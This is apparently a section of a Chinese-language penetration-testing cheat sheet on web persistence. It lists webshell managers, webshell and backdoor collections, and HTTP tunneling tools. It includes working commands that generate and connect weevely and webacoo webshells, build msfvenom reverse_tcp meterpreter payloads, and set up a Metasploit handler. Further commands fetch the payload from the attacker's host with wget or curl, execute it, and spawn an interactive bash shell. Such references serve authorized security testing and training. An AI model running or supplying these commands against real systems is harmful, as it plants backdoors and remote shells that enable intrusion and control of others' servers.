Web持久化
----------------------------------------

WebShell管理工具
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `菜刀 <https://github.com/Chora10/Cknife>`_
	+ 支持asp，jsp，php，不支持HTTPS。
	+ 一句话木马通用后门。
- `Cknife <https://github.com/Chora10/Cknife>`_
	+ 支持asp，jsp，php，支持HTTPS。
	+ 一句话木马通用后门。
- `antSword <https://github.com/antoor/antSword>`_
	+ 支持asp，jsp，php。
	+ 一句话木马通用后门。
- `冰蝎 <https://github.com/rebeyond/Behinder>`_
	+ 动态二进制加密网站管理客户端，支持java,.net,php，HTTPS。
	+ 非通用后门。
- `Altman <https://github.com/keepwn/Altman>`_ 
	+ 支持asp，jsp，php。
- `Webshell Sniper <https://github.com/WangYihang/Webshell-Sniper>`_ 
	+ 仅支持在类Unix系统上运行。
- `quasibot <https://github.com/Smaash/quasibot>`_ complex webshell manager, quasi-http botnet
- webacoo
	+ 仅支持PHP，非通用后门。
	+ 生成webshell： ``webacoo -g -o webacootest.php`` 
	+ 连接后门： ``webacoo -t -u http://106.54.74.40/webacootest.php`` 
- `weevely3 <https://github.com/epinna/weevely3>`_ Weaponized web shell
	+ 仅支持PHP，非通用后门。
	+ 生成webshell： ``weevely generate weevelytest ./weevelyphp.php`` 
	+ 连接后门： ``weevely http://106.54.74.40/weevelyphp.php weevelytest`` 
	+ 连接成功后，输入help，可以查看支持的命令和功能，注意执行模板命令需要加:号。
- `Godzilla哥斯拉 <https://github.com/BeichenDream/Godzilla>`_
	+ 支持asp，jsp，php，支持HTTPS。
	+ 非通用后门。
- Metasploit生成后门
	+ ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp`` 
	+ ``msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=118.195.199.66 LPORT=7777 -f elf > shell_x64.elf``
	+ 开启C2服务
		::
		
			use exploit/multi/handler
			set PAYLOAD windows/meterpreter/reverse_tcp
			set LHOST 10.10.10.131
			set LPORT 7777
			exploit
			
	+ 上传木马
		
		::
		
		
			命令执行上传：
			system('wget http://10.10.10.131/shell_x64.elf -P /tmp/')
			
	+ 执行木马
	
		::
			
			system('chmod 777 /tmp/shell_x64.elf')
			system('/tmp/shell_x64.elf')
			注意tmp目录有写入执行权限。
		
			web页面：system("curl http://10.10.10.131/shell.asp")
				
	+ 交互
		::
		
		
			进入交互页面meterpreter会话执行以下：
			shell
			python -c "import pty;pty.spawn('/bin/bash')"

WebShell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `php-reverse-shell <http://pentestmonkey.net/tools/web-shells/php-reverse-shell>`_
- `webshell <https://github.com/tennc/webshell>`_
- `PHP backdoors <https://github.com/bartblaze/PHP-backdoors>`_
- `php bash - semi-interactive web shell <https://github.com/Arrexel/phpbash>`_
- `Python RSA Encrypted Shell <https://github.com/Eitenne/TopHat.git>`_
- `b374k - PHP WebShell Custom Tool <https://github.com/b374k/b374k>`_
- ``/usr/share/webshells/*`` 

Web后门
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `pwnginx <https://github.com/t57root/pwnginx>`_
- `Apache backdoor <https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor>`_
- `SharpGen <https://github.com/cobbr/SharpGen>`_  .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile .NET Framework console applications or libraries
- `IIS-Raid <https://github.com/0x09AL/IIS-Raid>`_ A native backdoor module for Microsoft IIS

转发
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `reDuh <https://github.com/sensepost/reDuh>`_ Create a TCP circuit through validly formed HTTP requests
- `reGeorg <https://github.com/sensepost/reGeorg>`_ pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn
- `Neo-reGeorg <https://github.com/L-codes/Neo-reGeorg>`_ Neo-reGeorg is a project that seeks to aggressively refactor reGeorg
- `ABPTTS <https://github.com/nccgroup/ABPTTS>`_ TCP tunneling over HTTP/HTTPS for web application servers
